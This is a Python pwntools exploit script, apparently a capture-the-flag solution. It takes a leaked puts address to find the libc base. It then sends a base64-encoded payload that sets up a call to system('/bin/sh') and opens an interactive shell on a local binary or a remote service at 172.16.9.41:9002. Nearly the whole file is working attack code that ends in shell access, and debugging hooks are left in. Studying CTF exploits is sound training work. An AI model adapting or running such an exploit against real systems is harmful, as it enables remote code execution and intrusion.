#coding:utf-8
import sys
import base64
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	#try :
		if len(sys.argv)==1 :
			io=process('./pwn')
			#io=process(['./pwn'],env={'LD_PRELOAD':'./libc.so.6'})
			elf=ELF('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
		else :
			io=remote('172.16.9.41',9002)
			elf=ELF('pwn')
			libc=ELF('./libc.so.6')
		
		io.recvuntil(':0x')
		libc_base=int(io.recv(12),16)-libc.sym['puts']
		gdb.attach(io)
		pause()
		pay=p64(0x10)+p64(0)+p64(libc_base+libc.search('/bin/sh\x00').next())+p64(0x40)+'system\x00\x00'+p64(0)
		pay=base64.b64encode(pay)
		io.sendline(pay)






		io.interactive()


	#except Exception as e:
		#raise e
	#else:
		#pass